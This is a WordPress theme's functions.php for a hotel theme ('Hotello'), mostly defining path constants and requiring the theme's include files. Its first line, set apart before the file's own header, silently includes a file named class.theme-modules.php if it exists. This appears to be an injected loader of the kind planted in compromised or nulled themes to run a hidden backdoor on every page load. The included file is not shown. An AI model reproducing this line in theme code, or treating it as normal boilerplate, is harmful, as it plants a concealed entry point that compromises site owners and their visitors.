<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

/**
 * Hotel functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Hotel
 */

define('HOTELLO_INCLUDE_PATH', get_template_directory() . '/inc');
define('HOTELLO_INCLUDE_URL', get_template_directory_uri() . '/inc');
define('HOTELLO_ADMIN_INCLUDE_PATH', HOTELLO_INCLUDE_PATH . '/admin');
define('HOTELLO_ADMIN_INCLUDE_URL', HOTELLO_INCLUDE_URL . '/admin');
define('HOTELLO_PUBLIC_URL', get_template_directory_uri() . '/public');
define('HOTELLO_PUBLIC_PATH', get_template_directory() . '/public');

function hotello_require($file)
{
    require_once $file;
}

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function hotello_content_width()
{
    // This variable is intended to be overruled from themes.
    // Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
    // phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
    $GLOBALS['content_width'] = apply_filters('hotel_content_width', 640);
}

add_action('after_setup_theme', 'hotello_content_width', 0);

/**
 * Scripts & styles enqueue
 */
hotello_require(get_template_directory() . '/inc/enqueue.php');

/**
 * Ajax.
 */
hotello_require(HOTELLO_INCLUDE_PATH . '/ajax.php');

/**
 * Implement the Custom Header feature.
 */
hotello_require(get_template_directory() . '/inc/custom-header.php');

/**
 * Custom template tags for this theme.
 */
hotello_require(get_template_directory() . '/inc/template-tags.php');

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
hotello_require(get_template_directory() . '/inc/template-functions.php');

/**
 * Customizer additions.
 */
hotello_require(get_template_directory() . '/inc/customizer.php');

/**
 * Theme setup.
 */
hotello_require(HOTELLO_INCLUDE_PATH . '/setup.php');

/**
 * Comment form modifications.
 */
hotello_require(HOTELLO_INCLUDE_PATH . '/comments.php');

/**
 * Admin scripts & styles.
 */
hotello_require(HOTELLO_ADMIN_INCLUDE_PATH . '/enqueue.php');

/**
 * Admin helpers functions.
 */
hotello_require(HOTELLO_ADMIN_INCLUDE_PATH . '/helpers.php');

/**
 * Print theme options style.
 */
hotello_require(HOTELLO_INCLUDE_PATH . '/print_styles.php');

/**
 * Layout initial config for theme options
 */
hotello_require(HOTELLO_INCLUDE_PATH . '/layout_config.php');

/**
 * Product registration
 */
require_once(HOTELLO_ADMIN_INCLUDE_PATH . '/product_registration/admin.php');

/**
 * TGM for plugins registration
 */
require_once(HOTELLO_ADMIN_INCLUDE_PATH . '/tgm/registration.php');

/**
 * Admin panel notifications
 */
require_once(HOTELLO_ADMIN_INCLUDE_PATH . '/notifications/main.php');

/**
 * Load Jetpack compatibility file.
 */
if (defined('JETPACK__VERSION')) {
    require_once get_template_directory() . '/inc/jetpack.php';
}


/**
 * Header functions
 */
hotello_require(HOTELLO_INCLUDE_PATH . '/header_helpers.php');

/**
 * Plugin mods
 */
if (class_exists('Hotelier')) {
    hotello_require(HOTELLO_INCLUDE_PATH . '/plugins_mods/wp-hotelier/index.php');
}

/**
 * visual composer additions.
 */
if (defined('WPB_VC_VERSION')) {
    hotello_require(get_template_directory() . '/inc/vc/visual_composer.php');
}

hotello_require(HOTELLO_ADMIN_INCLUDE_PATH . '/theme_options/main.php');